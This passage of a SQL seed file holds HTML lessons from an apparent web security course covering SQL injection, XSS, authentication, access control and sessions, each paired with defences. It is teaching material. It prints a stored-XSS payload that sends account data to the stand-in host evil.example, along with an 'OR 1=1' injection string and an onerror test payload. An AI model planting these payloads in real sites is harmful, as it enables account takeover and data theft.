  <p>The attack surface is every input and entry point an attacker can reach. Enumerate it explicitly:</p>
  <ul>
    <li>Public routes, query parameters, and request bodies.</li>
    <li>File uploads, downloads, and import jobs.</li>
    <li>Third-party callbacks and webhooks.</li>
    <li>Admin panels, debug endpoints, and internal APIs exposed by mistake.</li>
    <li>Features behind feature flags and staged rollouts.</li>
  </ul>
  <p>Every square of surface costs money to defend. Removing an unused endpoint removes the threats that ride on it — the cheapest mitigation in security.</p>
  <div class="callout callout-tip">
    <strong>Score it</strong>
    <p>Rank each identified threat by likelihood and impact and fix the top cell first. A threat that is both probable and severe beats twenty theoretical ones.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000407',
  '02600000-0000-4000-8000-000000000307',
  1,
  'SQL Injection',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SQL Injection</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>SQL Injection</h1>
  <p><strong>SQL injection</strong> happens when user input is concatenated into a SQL statement and the database executes the attacker's text as code. It has been one of the top web attacks for decades, and it still tops breach reports because one vulnerable query can expose an entire table.</p>
  <h2>The vulnerable pattern</h2>
  <pre class="code-block">String q = "SELECT * FROM products WHERE name = '" + userInput + "'";

userInput = "phone' OR 1=1 --"
=&gt; SELECT * FROM products WHERE name = 'phone' OR 1=1 --'</pre>
  <p>The <span class="ic">'</span> closes the string, <span class="ic">OR 1=1</span> makes the condition always true, and <span class="ic">--</span> comments out the trailing quote. The query now returns every product — and worse, the attacker can reach any statement you can run.</p>
  <h2>What an attacker can do</h2>
  <table>
    <tr><th>Primitive</th><th>Impact</th></tr>
    <tr><td>Boolean / union injection</td><td>Extract rows and columns from other tables</td></tr>
    <tr><td>Blind injection</td><td>Leak data one true/false response at a time</td></tr>
    <tr><td>Second-order injection</td><td>Stored value executed later by another query</td></tr>
    <tr><td>Stacked statements</td><td>INSERT, UPDATE, DELETE, or dangerous functions</td></tr>
    <tr><td>File / command bridges</td><td>Read files or run OS commands via DB extensions</td></tr>
  </table>
  <h2>Discovery signals</h2>
  <ul>
    <li>A quote or comment character in a field changes the response or triggers an error.</li>
    <li>Database errors appear in HTTP responses, such as <span class="ic">syntax error at or near</span>.</li>
    <li>Timing changes when the attacker injects delay functions.</li>
  </ul>
  <h2>The fix is boring and final</h2>
  <pre class="code-block">-- Use parameters; the driver treats input as data, never as code.
SELECT * FROM products WHERE name = $1</pre>
  <div class="callout">
    <strong>Why it keeps happening</strong>
    <p>Developers concatenate strings because it is quick, and the query works on the happy path. The injection only shows itself to the attacker who tries a quote.</p>
  </div>
  <div class="callout callout-info">
    <strong>ORM note</strong>
    <p>An ORM helps only if you use it for queries. Anywhere you fall back to raw SQL, a WHERE clause built by string concatenation is injection again.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000408',
  '02600000-0000-4000-8000-000000000308',
  1,
  'Parameterized Queries & Defense in Depth',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Parameterized Queries &amp; Defense in Depth</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Parameterized Queries &amp; Defense in Depth</h1>
  <p>The single most important SQL injection defense is <strong>parameterization</strong>: the SQL text is fixed, and every value is bound separately. The database then has no way to confuse data with syntax.</p>
  <h2>Safe against injection</h2>
  <pre class="code-block">-- Send SQL text and values separately.
Query: SELECT * FROM products WHERE name = $1
Value: phone' OR 1=1 --

Result: no row matches, because the value is data.
The quote is just a character inside the string, not syntax.</pre>
  <h2>The same idea in each layer</h2>
  <table>
    <tr><th>Stack</th><th>Pattern</th></tr>
    <tr><td>Raw SQL</td><td>Placeholders ($1 / ?) with bound values</td></tr>
    <tr><td>ORM</td><td>Query builder methods; never raw SQL built by concatenation</td></tr>
    <tr><td>Stored procedure</td><td>Accept parameters, forbid dynamic EXEC</td></tr>
    <tr><td>Driver / library</td><td>Prepared statements from the driver API</td></tr>
  </table>
  <h2>Defense in depth</h2>
  <p>Parameterization kills the attack, but layers around it reduce blast damage:</p>
  <ol>
    <li><strong>Least privilege DB user</strong> — the app connects with a role that cannot DROP tables.</li>
    <li><strong>Input validation</strong> — reject obviously hostile shapes early (though validation alone is not enough).</li>
    <li><strong>Strict output handling</strong> — errors never surface raw SQL text.</li>
    <li><strong>WAF rules</strong> — a secondary net, never the primary defense.</li>
    <li><strong>Monitoring</strong> — flag unusual query patterns such as a flood of OR 1=1.</li>
  </ol>
  <h2>A hardened login query</h2>
  <pre class="code-block">const sql = 'SELECT id, name FROM users WHERE email = $1';
const { rows } = await pool.query(sql, [email]);
// email is data. Whatever it contains, it cannot change the SQL.</pre>
  <div class="callout callout-tip">
    <strong>Golden rule</strong>
    <p>If a query string contains a variable, the query is probably vulnerable. If it contains only placeholders, it is probably fine.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000410',
  '02600000-0000-4000-8000-000000000310',
  1,
  'Cross-Site Scripting (XSS)',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cross-Site Scripting (XSS)</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Cross-Site Scripting (XSS)</h1>
  <p><strong>XSS</strong> tricks the victim's browser into executing attacker-supplied JavaScript inside a trusted page. The browser cannot distinguish your code from the attacker's — both arrive as response bytes.</p>
  <h2>The three flavors</h2>
  <table>
    <tr><th>Type</th><th>Where it lives</th><th>Typical sink</th></tr>
    <tr><td>Reflected</td><td>In the URL / request; echoed back once</td><td>Search results, error pages</td></tr>
    <tr><td>Stored</td><td>In the database; runs for every visitor</td><td>Comments, profiles, forum posts</td></tr>
    <tr><td>DOM-based</td><td>Only in client-side code</td><td>innerHTML, location.hash, eval</td></tr>
  </table>
  <h2>A stored XSS payload</h2>
  <pre class="code-block">&lt;script&gt;fetch('/api/account', { credentials: 'include' })
  .then(r =&gt; r.json())
  .then(data =&gt; new Image().src = 'https://evil.example/leak?' +
       JSON.stringify(data));&lt;/script&gt;</pre>
  <p>If a comment form stores this and the review page renders it with <span class="ic">innerHTML</span>, every visitor to the page silently exfiltrates their own session and account data.</p>
  <h2>What the attacker gains</h2>
  <ul>
    <li>Session cookies (unless <span class="ic">HttpOnly</span>) — full account takeover.</li>
    <li>Keystrokes, clipboard, and form inputs.</li>
    <li>Modifying the page to lure credentials — phishing inside your own UI.</li>
    <li>Reading local tokens and making requests as the victim.</li>
  </ul>
  <h2>Where it hides</h2>
  <ul>
    <li><span class="ic">innerHTML</span>, <span class="ic">document.write</span>, <span class="ic">outerHTML</span>, <span class="ic">insertAdjacentHTML</span>.</li>
    <li>Attributes like <span class="ic">href</span>, <span class="ic">src</span>, and <span class="ic">onerror</span> built from user text.</li>
    <li>Template engines with auto-escaping turned off.</li>
    <li>URL fragments and <span class="ic">location</span> handling on the client.</li>
  </ul>
  <div class="callout">
    <strong>Validation is not enough</strong>
    <p>Blocking obvious tags is whack-a-mole: payloads arrive encoded, split, and obfuscated. The reliable defense is output encoding — never letting user text be interpreted as markup.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000411',
  '02600000-0000-4000-8000-000000000311',
  1,
  'Preventing XSS: Output Encoding & CSP',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Preventing XSS: Output Encoding &amp; CSP</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Preventing XSS: Output Encoding &amp; CSP</h1>
  <p>XSS is defeated by making sure untrusted text is always treated as <em>data</em> in the context where it is rendered. The single strongest habit: when a value is displayed, decide how it may be interpreted — text, attribute, URL, or script — and encode for exactly that context.</p>
  <h2>Context-aware encoding</h2>
  <table>
    <tr><th>Context</th><th>Rule</th><th>Example</th></tr>
    <tr><td>Element text</td><td>Escape &lt; &gt; &amp; quotes</td><td>&amp;lt;script&amp;gt; stays inert</td></tr>
    <tr><td>Attribute value</td><td>Never allow raw URLs of untrusted origin</td><td>validate scheme: https only</td></tr>
    <tr><td>JavaScript string</td><td>Avoid passing untrusted data into script</td><td>use textContent, not eval</td></tr>
    <tr><td>CSS</td><td>Never place user input in style or url()</td><td>reject with allowlist</td></tr>
  </table>
  <h2>Use the safe APIs</h2>
  <pre class="code-block">// Safe: user text stays text.
const el = document.createElement('span');
el.textContent = userComment;
list.append(el);

// Unsafe: user text becomes HTML.
list.innerHTML = '&lt;div&gt;' + userComment + '&lt;/div&gt;';</pre>
  <p>Frameworks such as React escape by default. The danger returns the moment you use <span class="ic">dangerouslySetInnerHTML</span> or <span class="ic">v-html</span>.</p>
  <h2>Content-Security-Policy</h2>
  <p>CSP is the browser-side firebreak that neutralizes XSS even when a payload gets through:</p>
  <pre class="code-block">Content-Security-Policy: default-src 'self';
  script-src 'self';
  object-src 'none';
  base-uri 'self'</pre>
  <p>With <span class="ic">script-src 'self'</span>, an injected <span class="ic">&lt;script&gt;</span> tag cannot load an external payload and inline handlers are blocked.</p>
  <h2>Defense stack</h2>
  <ol>
    <li>Encode output per context (primary defense).</li>
    <li>Mark session cookies <span class="ic">HttpOnly</span> so scripts cannot steal them.</li>
    <li>Serve a strict CSP that blocks inline and remote script.</li>
    <li>Sanitize rich HTML with a maintained allowlist library only where rich text is truly required.</li>
  </ol>
  <div class="callout callout-tip">
    <strong>Test with payloads</strong>
    <p>Submit this to every input and watch your DevTools console: <span class="ic">&lt;img src=x onerror="alert(document.domain)"&gt;</span>. If a dialog or console error appears, the sink is open.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000413',
  '02600000-0000-4000-8000-000000000313',
  1,
  'Authentication Flaws',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Authentication Flaws</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Authentication Flaws</h1>
  <p><strong>Authentication</strong> proves who you are. Attacks against it rarely exploit clever cryptography — they exploit bad decisions: weak passwords, missing rate limits, and trusting the client.</p>
  <h2>Common weaknesses</h2>
  <table>
    <tr><th>Weakness</th><th>Consequence</th></tr>
    <tr><td>No rate limit on login</td><td>Unlimited brute force and credential stuffing</td></tr>
    <tr><td>Passwords stored in plaintext</td><td>One dump leaks every account</td></tr>
    <tr><td>No MFA</td><td>One stolen password is a total compromise</td></tr>
    <tr><td>User enumeration</td><td>Login errors reveal which emails exist</td></tr>
    <tr><td>Broken password reset</td><td>Reset tokens guessed or reused</td></tr>
    <tr><td>Weak session handling</td><td>Fixation, predictability, or no logout</td></tr>
  </table>
  <h2>Store passwords right</h2>
  <pre class="code-block">// Never: md5(password), sha256(password), plaintext.
// Correct: a slow password hash with a per-user salt.
hash = argon2(password, salt = random16bytes)
store: id, salt, hash, algo, iterations</pre>
  <p>Bcrypt, scrypt, and Argon2 are memory-hard; they make offline guessing expensive. <span class="ic">MD5</span> and <span class="ic">SHA</span> are unsuited for passwords no matter how many times they are salted.</p>
  <h2>Harden the login path</h2>
  <ul>
    <li>Rate limit per account and per client IP; back off exponentially.</li>
    <li>Require MFA for staff and high-privilege accounts.</li>
    <li>Return a generic error for any failed login so attackers cannot enumerate users.</li>
    <li>Hash the email in reset tokens; expire them in minutes; destroy on use.</li>
    <li>Log failed attempts and alert on spikes.</li>
  </ul>
  <div class="callout">
    <strong>Same path, same answer</strong>
    <p>Do not leak whether a password was wrong versus whether the user exists. Best practice: one code path, one message, similar timing for both cases.</p>
  </div>
  <div class="callout callout-info">
    <strong>Credential stuffing is automatic</strong>
    <p>Attackers replay passwords leaked from other services. Rate limiting and MFA are the two controls that stop the botnets, not longer password rules.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000414',
  '02600000-0000-4000-8000-000000000314',
  1,
  'Authorization & Access Control',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Authorization &amp; Access Control</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Authorization &amp; Access Control</h1>
  <p><strong>Authorization</strong> decides what an authenticated identity may do. Broken access control is ranked A01 in the OWASP Top 10 for a reason: it is common, easy to miss in review, and a single missing check exposes every row in a table.</p>
  <h2>The classic IDOR</h2>
  <pre class="code-block">GET /api/invoices/45291 HTTP/1.1
Cookie: session=...

Did the server check that invoice 45291 belongs to me?
If no: I can walk 1, 2, 3 ... and read every invoice.    // IDOR</pre>
  <p>An <strong>IDOR</strong> (Insecure Direct Object Reference) appears whenever the client passes an object identifier and the server trusts it without an ownership test.</p>
  <h2>Shapes of broken access control</h2>
  <ul>
    <li><strong>Horizontal:</strong> a user reads or edits another user's records.</li>
    <li><strong>Vertical:</strong> a regular user calls an admin endpoint by guess or escalation.</li>
    <li><strong>Missing function checks:</strong> the buttons are hidden in the UI, but the API behind them still works.</li>
    <li><strong>Method confusion:</strong> <span class="ic">GET</span> performs side effects, or <span class="ic">POST</span> reads private data.</li>
  </ul>
  <h2>The fix lives on the server</h2>
  <pre class="code-block">function getInvoice(user, invoiceId) {
  return db.one(
    'SELECT * FROM invoices WHERE id = $1 AND account_id = $2',
    [invoiceId, user.accountId]          // ownership in the query itself
  );
}
if (!invoice) return 404;                // never "found, but not yours"</pre>
  <p>Policy is enforced in the query: the identifier scope is part of the SQL. Object-level checks use the session-held identity, never a client-supplied owner.</p>
  <h2>Review checklist</h2>
  <table>
    <tr><th>Check</th><th>Ask</th></tr>
    <tr><td>Every object read</td><td>Is ownership verified server-side?</td></tr>
    <tr><td>Every state change</td><td>Does the endpoint check the role that may perform it?</td></tr>
    <tr><td>Admin functions</td><td>Are they reachable by name without role checks?</td></tr>
    <tr><td>Default deny</td><td>Is the default to deny, then allow explicitly?</td></tr>
  </table>
  <div class="callout callout-tip">
    <strong>Test as two users</strong>
    <p>Log in as user A, grab a URL from user B's screen, and open it. The moment it renders, you found an IDOR. Repeat for every object type.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000416',
  '02600000-0000-4000-8000-000000000316',
  1,
  'Secure Sessions & Cookies',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Sessions &amp; Cookies</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Secure Sessions &amp; Cookies</h1>
  <p>A session links a logged-in user to a browser across many requests. The only secret in that link is the session identifier — so everything else about how it is generated, stored, transmitted, and expired is a security decision.</p>
  <h2>Cookie attributes that matter</h2>
  <table>
    <tr><th>Attribute</th><th>Effect</th><th>Why you want it</th></tr>
    <tr><td>Secure</td><td>Cookie sent over HTTPS only</td><td>Blocks theft on plain HTTP</td></tr>
    <tr><td>HttpOnly</td><td>JavaScript cannot read it</td><td>XSS cannot steal the session</td></tr>
    <tr><td>SameSite=Lax/Strict</td><td>Limits cross-site sending</td><td>Strong CSRF protection</td></tr>
    <tr><td>Domain</td><td>Scopes the cookie</td><td>Never broaden to a shared parent</td></tr>
    <tr><td>Path</td><td>Scopes where it is sent</td><td>Minimize exposure surface</td></tr>
  </table>
